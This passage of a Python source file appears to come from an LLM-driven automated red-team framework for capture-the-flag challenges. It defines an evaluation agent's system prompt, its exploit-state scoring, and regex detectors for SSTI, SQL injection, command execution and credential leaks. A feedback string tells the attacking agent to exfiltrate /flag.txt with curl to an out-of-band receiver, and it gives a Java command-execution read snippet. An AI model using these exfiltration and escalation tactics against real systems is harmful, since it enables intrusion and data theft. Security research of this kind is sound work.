from __future__ import annotations

import json
import re
from pathlib import Path
from typing import Any

from core.challenge_adapter import ChallengeAdapter
from core.llm_client import DeepSeekClient
from core.memory_store import LayeredMemory
from core.settings import Settings
from memory.exploit_primitives import get_primitive_registry, ALL_PRIMITIVE_DEFINITIONS

# ────────────────────────────────────────────────────────────────
# 常量
# ────────────────────────────────────────────────────────────────
_MAX_OUTPUT_CHARS = 3000          # per-field budget before head+tail truncation (aligned with executor)
_HEAD_TAIL_CHARS  = 1000          # chars kept from head when truncating
_TAIL_CHARS       = 1500          # chars kept from tail (more: preserves stack traces / errors)
_ANSI_RE = re.compile(r"\x1b\[[0-9;]*[mGKHF]")

# Flag 格式白名单正则（CTF 常见格式）
_FLAG_PATTERNS: list[re.Pattern] = [
    re.compile(r"flag\{[^}]{1,200}\}", re.IGNORECASE),
    re.compile(r"CTF\{[^}]{1,200}\}", re.IGNORECASE),
    re.compile(r"DUCTF\{[^}]{1,200}\}", re.IGNORECASE),
    re.compile(r"HTB\{[^}]{1,200}\}", re.IGNORECASE),
    re.compile(r"picoCTF\{[^}]{1,200}\}", re.IGNORECASE),
    re.compile(r"[A-Z0-9_]{2,10}\{[A-Za-z0-9_\-=+/]{8,200}\}", re.IGNORECASE),
]

# 强攻击成功信号（非 flag 但明确表示攻击成功）
_SUCCESS_SIGNALS: list[re.Pattern] = [
    re.compile(r"Werkzeug\s+Debugger", re.IGNORECASE),
    re.compile(r"Traceback.*SECRET", re.IGNORECASE | re.DOTALL),
    re.compile(r'"api_key"\s*:', re.IGNORECASE),
    re.compile(r'"jwt_secret"\s*:', re.IGNORECASE),
    re.compile(r'"database_password"\s*:', re.IGNORECASE),
    re.compile(r'"rendered"\s*:\s*"49"', re.IGNORECASE),
    re.compile(r"<script>[^<]{0,200}</script>", re.IGNORECASE),
]

# 无回显 RCE 判定：步骤 ok=True 但 stdout 实质为空
_BLANK_STDOUT_RE = re.compile(r"^\s*$")

_BLIND_RCE_FEEDBACK = (
    "检测到命令可能已执行但无回显 (Blind RCE)。请立即停止单纯更换命令！"
    "必须升级战术：\n"
    "1. 优先使用 SDK 中的 `redteam_sdk.OOBReceiver` 进行带外数据提取 (OOB)，"
    "例如：`oob=OOBReceiver(port=8765); oob.start(); "
    "# payload 改为 curl -d @/flag.txt {oob.url}`\n"
    "2. 若在 Java/Python 等语言上下文中，使用代码级别的文件流读取（如 Java "
    "`new Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter('\\\\A').next()`）；\n"
    "3. 尝试在 shell 命令末尾追加 `2>&1` 将错误流合并到标准输出。"
)


# ────────────────────────────────────────────────────────────────
# System Prompt
# ────────────────────────────────────────────────────────────────
EVAL_SYSTEM = """你是 Co-RedTeam 评估智能体（Evaluation Agent），对齐论文 §3.3 职责。

【🔴 核心身份：零信任硬核裁判 — 最高优先级】

你是一个极其严苛、疑罪从有的裁判。你的默认立场是"攻击失败，直到看见铁证"。

【🔄 攻击状态机（Exploit State Machine）— 状态推断规则】

你必须根据 raw_stdout 中的实际证据，判定当前攻击处于以下哪个状态（按推进顺序排列）：

  init — 初始状态，尚未证实任何攻击面可达
    判定条件：所有步骤均失败（连接错误/认证失败/语法错误），无任何有效探测结果
    典型证据：[HTTP_ERR] Connection refused, [HTTP] 403/401, NameError, SyntaxError

  probe_success — 探测成功，确认漏洞触发点存在且可达
    判定条件：至少一个步骤收到目标正常响应（HTTP 200），响应内容与预期业务逻辑吻合
    典型证据：[HTTP] 200 + 正常业务JSON/HTML，确认端点/参数/注入点可达
    ⚠️ 仅有 HTTP 200 不能判定为 payload_injected！

  payload_injected — Payload 已成功注入并被目标系统接受/处理
    判定条件：HTTP 响应中出现 payload 被处理/反射/存储的证据，但尚未触发利用效果
    典型证据：[HTTP] 200 + 响应体中包含注入的 payload 内容、JWT被接受、文件上传成功
    关键区分：payload 被"接受"了，但尚未产生 S 级物理铁证

  gadget_triggered — 利用链触发，漏洞已激活并产生可观测效果
    判定条件：S 级或 A 级物理铁证出现（uid=0、/etc/passwd、SSTI计算值、SQL数据回显）
    典型证据：stdout 中出现命令执行结果、SSTI {{7*7}}→49、SQL查询结果、文件内容
    此状态是 repro_success=true 的必要条件

  oob_received — 带外数据已成功到达
    判定条件：OOBReceiver 收到目标回连，且携带有效数据（flag、文件内容、token）
    典型证据：OOB hit 包含 flag 内容、cookie/session token、数据库dump
    此状态等价于 gadget_triggered + 数据成功外传，repro_success=true

【状态转换硬规则】：
  - 必须按顺序推进：init → probe_success → payload_injected → gadget_triggered → oob_received
  - 严禁跳级：没有 probe_success 证据（HTTP 200 + 正常响应），不得判定为 payload_injected
  - 严禁回退：一旦达到某个状态，本轮 current_exploit_state 不得低于该状态
  - state_transition_blocker 必须精确引用 HTTP 响应体中的具体字段/状态码/错误信息
  - 如果代码 STEP_OK 但状态未推进 → 这是最危险的"静默失败"，必须深入分析 HTTP 响应体

【🚫 泛化回退禁令 — 代码执行成功但利用未推进时】：
当步骤 exit_code=0（STEP_OK）但未产生 S 级或 A 级证据时，以下回退输出被严格禁止：
  ❌ error_fingerprint="NoError" — 没有崩溃不代表攻击成功！静默失败不是成功！
  ❌ current_exploit_state 跳级 — 不能从 init 直接跳到 gadget_triggered
  ❌ state_transition_blocker="无" 或 "没有阻塞" — 状态未推进必有阻塞点，必须找到它
  ❌ next_required_action="继续尝试" — 必须给出具体的字段名/端点/payload 修改方案
  ❌ milestones_achieved=["无"] — 如果 probe_success 达成，必须记录
正确做法：
  ✅ error_fingerprint 填写实际 HTTP 响应特征（如 HTTPError4xx、AllFieldsRequired）
  ✅ current_exploit_state 准确反映当前最高证据等级
  ✅ state_transition_blocker 引用具体 HTTP 响应内容解释为何 payload 未被触发
  ✅ next_required_action 给出可直接复制的代码修改（精确到字段名/endpoint/payload格式）

	【绝对禁止】以下幻觉陷阱：
  1. 严禁仅凭 HTTP 状态码（如 200、403、500）就判定"漏洞存在"或"利用成功"。
     403 可能只是 WAF 的正常拦截，500 可能只是应用自身的业务 Bug，不等于攻击成功。
  2. 严禁轻信 Planner 的自我评估（如 Plan 中声称"我认为已成功"）。
     Planner 是攻击者，它会撒谎、会自我欺骗、会产生幻觉。你只相信 Executor 传回的原始数据。
  3. 严禁在没有物理层面证据的情况下给出 repro_success=true。
     如果 raw_stdout 中看不到确凿的证据，你必须判决 status: failed。

【🟢 物理层面铁证清单 — 只有看到以下之一才能判成功】：

  证据等级 S（必须看到至少一条，repro_success=true, confidence ≥ 0.9）：
    ✅ uid=0(root) 或 uid=1000(www-data) 等系统命令输出（说明已 RCE）
    ✅ /etc/passwd 文件内容的实际回显（如 root:x:0:0:root:/root:/bin/bash）
    ✅ /etc/shadow 或 /flag.txt 等敏感文件的完整内容回显
    ✅ 数据库表名/列名/行数据的实际回显（如 SELECT 查询结果表格）
    ✅ 延时注入的时间侧信道证据：OOBReceiver 记录的请求耗时 ≥ 10 秒
    ✅ flag{...} / CTF{...} / HTB{...} 等 CTF 格式字符串的完整回显
    ✅ OOB 带外回调成功收到数据（hit 含 body/path 且内容非空）

  证据等级 A（单独不够，需多条组合才能 repro_success=true, confidence ≤ 0.7）：
    ⚠️ 命令注入后输出中出现预期系统信息（如 Linux version、kernel 版本、hostname）
    ⚠️ SSTI 注入后输出中出现数学计算结果（如 49=7*7、7777777='7'*7）
    ⚠️ SQL 注入后输出中出现数据库版本字符串（如 MySQL 8.0.33、PostgreSQL 14.2）
    ⚠️ XSS 注入后 OOBReceiver 收到带 cookie/session 的回调
    ⚠️ 文件包含后输出中出现配置文件内容（如 DB_HOST=、SECRET_KEY=）

  证据等级 F（以下情况无论如何不得判成功）：
    ❌ "HTTP 200 OK" — 这不能证明任何事
    ❌ "HTTP 403 Forbidden" — 这通常是 WAF 行为，不是利用成功
    ❌ "HTTP 500 Internal Server Error" — 可能是 payload 格式错误导致应用崩溃
    ❌ "Connection refused" — 目标挂了
    ❌ stdout 为空但 exit_code=0 — 可能是挑战环境正常响应而非漏洞触发
    ❌ 仅看到 "success": true 或 "status": "ok" 等 JSON 字段 — 可能是正常业务响应
    ❌ 仅看到 Welcome 页面、HTML title、正常业务文案 — 未触发漏洞

【输出要求】严格输出单个 JSON 对象，禁止任何 Markdown 标记，字段如下：
{
  "repro_success": bool,
  "confidence": number (0.0-1.0),
  "evidence_level": "S" | "A" | "F",
  "hard_evidence_found": "具体在 raw_stdout 的哪一行发现了什么物理铁证（若没有则填 'NONE'）",
  "error_fingerprint": "具体错误类型，如 ConnectionRefused/NameError/HTTPError500/SyntaxError/AllFieldsRequired。若成功则为空字符串。禁止填写 unknown_error 除非所有步骤 stdout 为空且你已在 raw_evidence 中明确说明。",
  "current_exploit_state": "当前攻击状态机状态。必须从以下枚举中选择一个：init | probe_success | payload_injected | gadget_triggered | oob_received。严禁跳级。根据 raw_stdout 中的物理证据逐级判定。",
  "milestones_achieved": ["本轮达成的里程碑列表。每个里程碑格式：'[state]: 具体描述'。例如：['probe_success: 确认 /api/login endpoint 可达，HTTP 200 + JSON 响应正常']。若本轮无任何进展，填写 ['init: 本轮未取得进展']。禁止空列表或 ['无']。"],
  "state_transition_blocker": "当前状态转换的具体阻塞点。必须精确引用 HTTP 响应体中的字段名/状态码/错误信息。例如：'HTTP 200 body: {\"error\":\"Invalid Email Address\"}，字段名 email 被拒绝，需改用 username 注入'。如果已达 gadget_triggered/oob_received，填写 'N/A — 已到达最终状态'。",
  "next_required_action": "打破 state_transition_blocker 必须执行的操作。必须提供可直接复制的代码片段或精确修改指令。例如：'将 data={'email': payload} 改为 data={'username': payload}，注入 SSTI 探测 {{7*7}}'。禁止泛泛地说'调整参数'。",
  "what_worked": "哪些步骤成功了，具体做了什么（列出 step_id 和成功原因）",
  "what_failed": "哪些步骤失败了，具体报错是什么（列出 step_id 和 stderr/stdout 中提取的错误信息）",
  "raw_evidence": "从 stdout 中提取的关键证据片段，原文引用（包括 [HTTP] 日志、STEP_OK/STEP_FAIL 标记、异常 traceback）。如果所有步骤 stdout 为空，必须明确报告'所有步骤 stdout 为空，Executor 输出捕获可能存在问题'。",
  "hypothesis": "基于 raw_evidence 中的真实证据推测本次失败的根因，不能凭空猜测。若无法推断则填写'证据不足，无法推断'。",
  "next_direction": "（已废弃字段，使用 next_required_action + state_transition_blocker 代替）建议 Planner 下一步改变什么",
  "analysis": {
    "what_happened": "string — 逐步描述实际发生了什么：引用真实的 HTTP 状态码、响应体片段、错误信息、OOB 回调内容",
    "vs_expectation": "string — 逐步对比每个步骤的 expected_outcome 与实际输出，说明哪些达到预期、哪些没有、为什么",
    "guidance": "string — 给 Planner 的下一步确切建议：必须包含可直接复制的代码片段或 payload，不能只说'修正字段名'"
  },
  "summary": "string — 一句话总结本轮结果，若失败必须以'[FAILED]'开头并给出驳回理由",
  "feedback_for_planner": "string — 对 Planner 的直接指令，必须可操作",
  "should_continue": bool,
  "suggest_abort": bool,
  "is_milestone": bool,
  "memory_patch": {
    "pattern": { "add_patterns": [ { ... } ] },
    "strategy": { "add_success": [ { ... } ], "add_failures": [ { ... } ] },
    "tech": { "add_commands": [ { ... } ], "add_payload_templates": [ { ... } ], "add_scripts": [ { ... } ] }
  },
  "detected_primitives": ["从执行输出中检测到的 exploit primitive 列表。必须从 Primitive Taxonomy 中选择。例如：['ssti_reflection', 'ssti_execution']。如果未检测到任何 primitive，填写空列表 []。"],
  "primitive_confidence": {"ssti_reflection": 0.92, "ssti_execution": 0.85},
  "primitive_evidence": {"ssti_reflection": "{{7*7}} reflected as 49 — template expression evaluated and computed"},
  "exploit_chain_primitive": ["按时间顺序排列的已激活 primitive 链。例如：['ssti_reflection'] 或 ['ssti_reflection', 'ssti_execution']。空列表表示尚未激活任何 primitive。"]
}

【error_fingerprint 枚举规范】：
你必须从以下枚举中选择最匹配的错误类型填入 error_fingerprint 字段：
  ConnectionRefused — 目标连接被拒绝
  ConnectionTimeout — 目标连接超时
  NameError — Python 变量/方法名不存在
  SyntaxError — Python 语法错误
  ImportError — 导入模块失败
  HTTPError4xx — HTTP 4xx 客户端错误（403/404/405 等）
  HTTPError5xx — HTTP 5xx 服务器错误
  AllFieldsRequired — REST API 返回 "All fields are required"
  InvalidEmail — REST API 返回 "Invalid Email Address"
  CSRFDetected — REST API 返回 "CSRF Detected"
  Unauthorised — REST API 返回认证失败
  JWTFormatError — JWT/Base64 格式错误
  AllStdoutEmpty — 所有步骤 stdout 为空（此时 repro_success 必须为 false）
  NoError — 所有步骤成功，无可检测错误

【重要：error_fingerprint 禁止 unknown_error！】
如果在枚举列表中找不到匹配项 → 仔细检查 raw_evidence 中的 [HTTP] 日志和 STEP_FAIL 标记。
如果确实无法归类 → 填写最接近的枚举值，并在 raw_evidence 中附上原始错误文本。
如果所有步骤 stdout 为空 → 填写 AllStdoutEmpty，而不是 unknown_error。
unknown_error 只有在连 AllStdoutEmpty 都不满足时（如 executor 本身崩溃）才能使用。

【成功判定流程（必须严格按此顺序执行）】：

第 1 步 — 扫描 raw_stdout 中的物理铁证：
  逐行、逐段扫描每个步骤的 stdout 和 stderr 输出。
  对照"物理层面铁证清单"，判断是否出现 S 级或 A 级证据。
  在 hard_evidence_found 字段中填写证据所在的步骤 ID 和具体行内容。

第 2 步 — 对照 expected_outcome 逐条验证：
  对每个步骤，将其 expected_outcome 与实际输出对比。
  如果 Planner 声称"已获得 RCE"，但 stdout 中没有 uid= 或 /etc/passwd 内容 → 判定为幻觉，repro_success=false。

第 3 步 — 疑罪从有原则：
  如果 raw_stdout 中没有任何 S 级铁证 → repro_success=false。
  如果仅有 A 级证据 → confidence ≤ 0.7，且必须在 analysis.what_happened 中说明"暂无 S 级铁证，需进一步确认"。
  如果仅有 F 级证据 → repro_success=false，confidence ≤ 0.2。

第 4 步 — Blind RCE 特殊判定：
  若有步骤 ok=True（exit_code=0）但该步骤 stdout 实质为空，且未检测到 flag：
  → repro_success=false，confidence ≤ 0.5（绝对禁止 ≥ 0.9）
  → feedback_for_planner 必须包含 OOB 战术升级指引
  → 禁止因"exit_code=0"就断定攻击成功！

【analysis 三段论填写规则（必须严格执行）】：
- what_happened：必须引用真实的 raw_stdout 行号和内容，不能泛泛而谈。例如"step 3 的 stdout 第 12 行出现 uid=33(www-data) gid=33(www-data)"。
- vs_expectation：逐步对比 expected_outcome，明确指出差距。若 expected_outcome 是"获取 /flag.txt 内容"但 stdout 只有 "HTTP 200"，则写入"预期获取文件内容，实际仅有 HTTP 200，无任何文件数据回显 — 判定失败"。
- guidance：必须给出可直接复制的具体修复代码或 payload，不能只说"修正字段名"。若判定失败，必须给出无情的驳回理由和具体修正方案。

【memory_patch 填写规则】：
- 每个失败步骤必须对应一条 add_failures（错误模式 + 根因 + 修复建议）
- 成功步骤的有效 payload 必须记录到 tech.add_payload_templates

【JWT/JSON Polyglot 构造错误识别】：
- 所有 stdout 中出现 "Invalid base64-encoded string: number of data characters (N) cannot be 1 more than a multiple of 4" → 这是 json.dumps(dict) polyglot 构造的签名错误！必须在 guidance 中给出字符串拼接示例代码
- 所有 stdout 中出现 "Invalid JWS Object" 或 "Invalid format" → 检查是否复制了模板中的 forge 函数。严禁使用 json.dumps() 构造 polyglot JSON

【REST API 错误识别】：
- "All fields are required!" + 用了 username → 正确字段是 email，必须在 guidance 给出示例代码
- "Invalid Email Address" + payload 含 {{ 或 {% → 换用 username/fullName 字段注入
- "CSRF Detected" → 检查 token 获取与传递方式
- 同一错误连续多轮 → guidance 必须给出可直接复制的正确代码

【is_milestone — 质变突破判定规则】：
is_milestone 代表本轮发生了"质变"级别的进展，而非仅仅置信度微升。
必须将 is_milestone 设为 true 的情况（满足任一即可）：
1. 首次成功完成注册/登录，获得有效 session/token（之前均失败）
2. 首次在 raw_stdout 中检测到 S 级铁证（uid=0、/etc/passwd、flag 等）
3. 首次触发漏洞并获得实质性响应（如 SSTI 返回计算结果、SQLi 返回数据库内容）
4. 首次获得新的权限层级（如普通用户→管理员、未认证→已认证）
5. 首次收到 OOB 回调且携带有效数据（SSRF/XSS/SSTI 带外数据到达）

以下情况 is_milestone=false：
- 置信度从 0.2 升到 0.3（微小提升）
- 步骤从 1 个 ok 变成 2 个 ok，但仍是同类型的探测步骤
- 仅修复了 payload 格式错误，尚未触发漏洞
- 任何没有 S 级或 A 级证据的轮次

【suggest_abort — AI 主动熔断判定规则】：
当出现以下任一情况时，必须将 suggest_abort 设为 true：
1. **目标服务不可用**：连续多轮出现 Connection refused / DNS解析失败 / 超时，且排除沙箱网络问题。
2. **WAF/IDS 封禁触发**：响应中出现 403 Forbidden + Cloudflare/AWS WAF 特征、IP 黑名单、速率限制封禁。
3. **策略彻底耗尽**：RAG 记忆库中所有已检索到的成功策略 + Payload 变体均已尝试，且 confidence 连续 3 轮无任何提升（变化 < 0.05），同时步骤全部失败。
4. **无漏洞实际存在**：所有探测步骤均证明注入点不存在（非 payload 错误，而是根本不存在该漏洞类型）。

正常情况（payload 错误、字段名不对、转义问题等可修复问题）→ suggest_abort=false。
仅当"继续迭代已无任何意义"时才设为 true。这是一个严肃的终止决策，不可滥用。"""


# ────────────────────────────────────────────────────────────────
# 脏数据清洗
# ────────────────────────────────────────────────────────────────

def _clean_str(s: str, max_chars: int = _MAX_OUTPUT_CHARS) -> str:
    """Strip ANSI escape codes and truncate to head+tail to prevent context flooding."""
    if not isinstance(s, str):
        s = str(s)
    s = _ANSI_RE.sub("", s)
    if len(s) > max_chars:
        head = s[:_HEAD_TAIL_CHARS]
        tail = s[-_TAIL_CHARS:]
        omitted = len(s) - _HEAD_TAIL_CHARS - _TAIL_CHARS
        s = f"{head}\n...[TRUNCATED {omitted} chars]...\n{tail}"
    return s


def _sanitize_exec_output(exec_out: dict[str, Any], plan: dict[str, Any] | None = None) -> dict[str, Any]:
    """Sanitize executor output: truncate stdout/stderr with head+tail, strip ANSI.

    Also injects each step's `expected_outcome` and `purpose` from the plan so the
    LLM can compare actual output against the step's stated goal without needing to
    cross-reference a separate document.
    """
    import copy
    out = copy.deepcopy(exec_out)

    # Build a step_id → plan_step lookup for expected_outcome injection
    plan_steps: dict[str, dict] = {}
    if plan:
        for st in plan.get("steps") or []:
            if isinstance(st, dict) and st.get("id") is not None:
                try:
                    plan_steps[str(st["id"])] = st
                except (ValueError, TypeError):
                    pass

    for sr in out.get("step_results") or []:
        res = sr.get("result") or {}
        res["stdout"] = _clean_str(res.get("stdout", ""))
        res["stderr"] = _clean_str(res.get("stderr", ""), max_chars=500)
        sr["result"] = res
        # Inject expected_outcome and purpose from plan so LLM can compare directly
        step_id = sr.get("step_id")
        if step_id is not None:
            try:
                key = str(step_id)
            except (ValueError, TypeError):
                key = ""
            if key in plan_steps:
                ps = plan_steps[key]
                sr.setdefault("expected_outcome", ps.get("expected_outcome", ""))
                sr.setdefault("purpose", ps.get("purpose", ""))
    return out


# ────────────────────────────────────────────────────────────────
# Flag / 成功信号检测
# ────────────────────────────────────────────────────────────────

def _detect_flag(text: str) -> str:
    """从文本中匹配 flag，返回第一个匹配或空字符串。"""
    for pat in _FLAG_PATTERNS:
        m = pat.search(text)
        if m:
            return m.group(0)
    return ""


def _detect_success_signal(text: str) -> str:
    """检测强攻击成功信号，返回触发的信号片段或空字符串。"""
    for pat in _SUCCESS_SIGNALS:
        m = pat.search(text)
        if m:
            return m.group(0)[:120]
    return ""


def _detect_primitives(all_stdouts: str, payload_text: str, step_results: list[dict[str, Any]]) -> dict[str, Any]:
    """从执行输出中自动检测 exploit primitive——本地启发式规则。

    返回: {"detected_primitives": [...], "primitive_confidence": {...}, "primitive_evidence": {...}}
    """
    registry = get_primitive_registry()
    detected: list[str] = []
    confidence: dict[str, float] = {}
    evidence: dict[str, str] = {}

    combined_text = f"{all_stdouts} {payload_text}".lower()

    # SSTI family
    if re.search(r'\{\{7\*7\}\}.*49|\$\{7\*7\}.*49', all_stdouts, re.DOTALL):
        detected.append("ssti_reflection")
        confidence["ssti_reflection"] = 0.92
        evidence["ssti_reflection"] = "{{7*7}} reflected as 49 — template expression evaluated"

    if re.search(r'<Config\s|secret_key|SECRET_KEY', all_stdouts, re.IGNORECASE):
        if "ssti_reflection" not in detected:
            detected.append("ssti_reflection")
        detected.append("ssti_execution")
        confidence["ssti_execution"] = 0.85
        evidence["ssti_execution"] = "Config object or secret_key accessed — code execution via template"

    if re.search(r'__globals__|__subclasses__|__mro__|__builtins__', all_stdouts, re.IGNORECASE):
        detected.append("ssti_execution")
        confidence["ssti_execution"] = 0.90
        evidence["ssti_execution"] = "Python object introspection via template — class traversal succeeded"

    # SQLi family
    if re.search(r'UNION\s+(ALL\s+)?SELECT\s+\d+', payload_text, re.IGNORECASE):
        detected.append("sql_union")
        confidence["sql_union"] = 0.70
        evidence["sql_union"] = "UNION SELECT payload detected in injected query"

    if re.search(r"'?\s*OR\s+['\"]?\d['\"]?\s*=\s*['\"]?\d['\"]?\s*--", payload_text, re.IGNORECASE):
        detected.append("sql_boolean")
        confidence["sql_boolean"] = 0.65
        evidence["sql_boolean"] = "Boolean-based SQL injection payload detected"

    # Command injection
    if re.search(r'[;&|`$]\s*(id|whoami|ls|cat|dir)', payload_text, re.IGNORECASE):
        detected.append("command_separator")
        confidence["command_separator"] = 0.75
        evidence["command_separator"] = "Shell separator with command detected in payload"

    if re.search(r'uid=\d+|gid=\d+|www-data|root:[x*]:', all_stdouts, re.IGNORECASE):
        detected.append("command_execution")
        confidence["command_execution"] = 0.95
        evidence["command_execution"] = "System command output detected — uid/gid or passwd content"

    # Post-exploitation
    if re.search(r'root:[x*]:\d+:\d+:|/etc/(passwd|shadow)', all_stdouts, re.IGNORECASE):
        detected.append("arbitrary_file_read")
        confidence["arbitrary_file_read"] = 0.95
        evidence["arbitrary_file_read"] = "/etc/passwd or shadow content found in output"

    if re.search(r'(password|passwd|secret|api_key|token)\s*[:=]\s*[\'"]?\S+', all_stdouts, re.IGNORECASE):
        detected.append("credential_dump")
        confidence["credential_dump"] = 0.80
        evidence["credential_dump"] = "Credentials extracted — password/secret/token found in output"

    # Deserialization
    if re.search(r'__reduce__|pickle\.(dumps|loads)|cos\\nsystem', payload_text, re.IGNORECASE):
        detected.append("deserialization_object_injection")
        confidence["deserialization_object_injection"] = 0.70
        evidence["deserialization_object_injection"] = "Pickle/reduce gadget chain payload detected"

    # OOB
    if re.search(r'OOBReceiver.*hit\.body|callback.*received|OOB.*hit\s', all_stdouts, re.IGNORECASE):
        detected.append("blind_rce_oob")
        confidence["blind_rce_oob"] = 0.90
        evidence["blind_rce_oob"] = "OOB callback received with data — blind RCE confirmed"

    # ── Partial confidence heuristics (incremental progress signals) ──
    # These detect intermediate progress that doesn't yet meet the high-confidence bar
    # but should NOT be flattened to 0 confidence.

    # Response length anomaly: payload caused a significant change in response size
    for sr in step_results:
        rr = sr.get("result") or {}
        stdout = rr.get("stdout", "")
        if re.search(r'Content-Length:\s*(\d+)', stdout, re.IGNORECASE):
            lengths = [int(m) for m in re.findall(r'Content-Length:\s*(\d+)', stdout, re.IGNORECASE)]
            if lengths and len(lengths) >= 2 and abs(lengths[0] - lengths[-1]) > 100:
                if "response_length_change" not in detected:
                    detected.append("response_length_change")
                    confidence["response_length_change"] = 0.30
                    evidence["response_length_change"] = (
                        f"Response length changed from {lengths[0]} to {lengths[-1]} "
                        f"(diff={abs(lengths[0]-lengths[-1])}) — payload may have altered behavior"
                    )

    # Payload reflection in HTTP response body
    if payload_text.strip():
        reflected_words = [w for w in payload_text.split() if len(w) > 6 and w.lower() in all_stdouts.lower()]
        if len(reflected_words) >= 2:
            if "payload_reflection" not in detected:
                detected.append("payload_reflection")
                confidence["payload_reflection"] = 0.35
                evidence["payload_reflection"] = (
                    f"Payload fragments reflected in response: {reflected_words[:3]}"
                )

    # OOB attempt: OOBReceiver was initialized/started but no callback yet
    if re.search(r'OOBReceiver\(|oob\.start\(\)|oob\.url|OOB.*URL:', all_stdouts, re.IGNORECASE):
        if "blind_rce_oob" not in detected:
            detected.append("oob_attempt")
            confidence["oob_attempt"] = 0.30
            evidence["oob_attempt"] = "OOB receiver started — attempting out-of-band extraction"

    # Server error triggered post-payload (500 only after injection)
    has_500 = bool(re.search(r'\[HTTP\]\s*5\d{2}', all_stdouts))
    has_200 = bool(re.search(r'\[HTTP\]\s*2\d{2}', all_stdouts))
    if has_500 and has_200:
        if "error_triggered" not in detected:
            detected.append("error_triggered")
            confidence["error_triggered"] = 0.35
            evidence["error_triggered"] = (
                "Mixed HTTP 200 and 5xx — payload triggered an error response "
                "alongside normal responses, suggesting injection reached the application"
            )

    # Timing anomaly: significant delay in response
    timing_delays = re.findall(r'(?:response_time|elapsed|duration)[:=]\s*([\d.]+)', all_stdouts, re.IGNORECASE)
    if timing_delays:
        delays = [float(d) for d in timing_delays]
        if max(delays) > 2.0:
            if "timing_anomaly" not in detected:
                detected.append("timing_anomaly")
                confidence["timing_anomaly"] = 0.30
                evidence["timing_anomaly"] = (
                    f"Response time {max(delays):.1f}s — payload may have caused "
                    f"blocking operation (sleep, DNS lookup, command execution)"
                )

    # Stdout fragments: partial command execution output
    fragment_signals = [
        (r'(?:total|drwx|rwx)\s+\d+', "file_listing_fragment", 0.45, "Directory listing fragment"),
        (r'uid=\d+|gid=\d+', "uid_fragment", 0.55, "System user id fragment"),
        (r'(?:Usage:|usage:)\s+\w+', "command_usage_fragment", 0.40, "Command usage output fragment"),
        (r'(?:error|Error|ERROR)[:\s].{10,60}', "error_message_fragment", 0.30, "Error message in output"),
    ]
    for pattern, pid, conf, desc in fragment_signals:
        if re.search(pattern, all_stdouts, re.IGNORECASE):
            if pid not in detected:
                detected.append(pid)
                confidence[pid] = conf
                evidence[pid] = f"{desc} found in stdout — incremental progress signal"

    # Also use the registry for matching
    registry_matches = registry.match_payload_to_primitive(payload_text, all_stdouts)
    for p, score in registry_matches[:3]:
        pid = p.primitive_id
        if pid not in detected:
            detected.append(pid)
            confidence[pid] = score
            evidence[pid] = f"Registry match: {p.description}"

    # Fill confidence for all detected
    for pid in detected:
        confidence.setdefault(pid, 0.6)
        evidence.setdefault(pid, f"Heuristic detection: {ALL_PRIMITIVE_DEFINITIONS.get(pid, {}).get('description', '')}")

    return {
        "detected_primitives": detected,
        "primitive_confidence": confidence,
        "primitive_evidence": evidence,
    }


def _detect_blind_rce(step_results: list[dict[str, Any]]) -> bool:
    """Return True when at least one step succeeded (ok=True) with blank stdout."""
    for sr in step_results:
        res = sr.get("result") or {}
        if res.get("ok") and _BLANK_STDOUT_RE.match(res.get("stdout", "")):
            return True
    return False


# ────────────────────────────────────────────────────────────────
#  Exploit Progress Engine (EPE) — semantic side-effect scoring
# ────────────────────────────────────────────────────────────────

# Level 1: Surface Signals — payload reached backend and perturbed its state
#   response_length_mutation, timing_anomaly, redirect_change_received,
#   new_cookie_set, http_500_post_payload, connection_reset_after_injection
_LEVEL_1_WEIGHTS: dict[str, float] = {
    "response_length_change": 0.15,
    "timing_anomaly":         0.15,
    "error_triggered":        0.20,
    "payload_reflection":     0.15,
    "error_message_fragment": 0.10,
}

# Level 2: Primitive Signals — exploit primitive established / backend parser disrupted
#   payload_reflection_rich, deserialization_fault_detected,
#   template_evaluation_artifact, backend_parser_state_changed,
#   backend_semantic_disruption
_LEVEL_2_WEIGHTS: dict[str, float] = {
    "oob_attempt":                    0.30,
    "command_usage_fragment":         0.30,
    "deserialization_object_injection": 0.40,
    "ssti_reflection":                0.40,
}

# Level 3: Capability Signals — attacker gained partial controlled capability
#   arbitrary_file_read_fragment, partial_command_output,
#   outbound_controlled_channel_established, filesystem_side_effect,
#   persistence_indicator
_LEVEL_3_WEIGHTS: dict[str, float] = {
    "command_separator":       0.50,
    "sql_union":               0.50,
    "sql_boolean":             0.50,
    "uid_fragment":            0.60,
    "file_listing_fragment":   0.55,
    "command_execution":       0.70,
    "credential_dump":         0.65,
    "arbitrary_file_read":     0.70,
    "ssti_execution":          0.70,
}

# Level 4: Objective Signals — mission accomplished
#   flag_captured, persistent_shell_established, oob_data_exfiltrated
_LEVEL_4_WEIGHTS: dict[str, float] = {
    "blind_rce_oob": 1.0,
}


def _compute_progress_score(
    all_stdouts: str,
    payload_text: str,
    step_results: list[dict[str, Any]],
    primitive_results: dict[str, Any],
    flag_found: str,
    success_signal: str,
) -> dict[str, Any]:
    """Semantic exploit progress evaluation — tiered side-effect scoring.

    Computes progress_score via non-linear accumulation across 4 abstraction levels.
    Each level's detected signals are combined via 1 - ∏(1 - w_i) within the level,
    then levels are stacked cumulatively (L1+L2+L3+L4). The result monotonically
    increases as the attacker gains control, even without an immediate flag.

    Never zeros out progress because "flag not yet captured" — side effects ARE progress.
    """
    primitives = set(primitive_results.get("detected_primitives", []))
    prim_conf = primitive_results.get("primitive_confidence", {})

    # ── Detect abstract behavioral evidence (NOT CWE-specific patterns) ──
    behavioral_signals: dict[str, float] = {}

    # → backend_parser_state_changed: any HTTP response mutation after payload
    has_http_changes = any(
        p in primitives for p in ("response_length_change", "error_triggered", "timing_anomaly")
    )
    if has_http_changes:
        behavioral_signals["backend_parser_state_changed"] = 0.18

    # → backend_deserialization_fault_detected: type confusion / deser errors
    deser_keywords = (
        r'deserializ|pickle|unpickle|unserializ|__reduce__|typeerror.*object|'
        r'cannot (?:deserializ|unpickle)|classnotfound|cannot cast|'
        r'java\.io\.(?:invalidclass|streamcorrupted)|invaliddataexception|'
        r'marshal\.loads.*error|unserialize\(\)|unmarshalling failed'
    )
    if re.search(deser_keywords, all_stdouts, re.IGNORECASE):
        behavioral_signals["backend_deserialization_fault_detected"] = 0.35

    # → backend_parser_state_changed via structure disruption (CRLF, protocol injection)
    if re.search(r'(?:protocol|parser?|syntax)\s+(?:error|fault|violation|unexpected)',
                 all_stdouts, re.IGNORECASE):
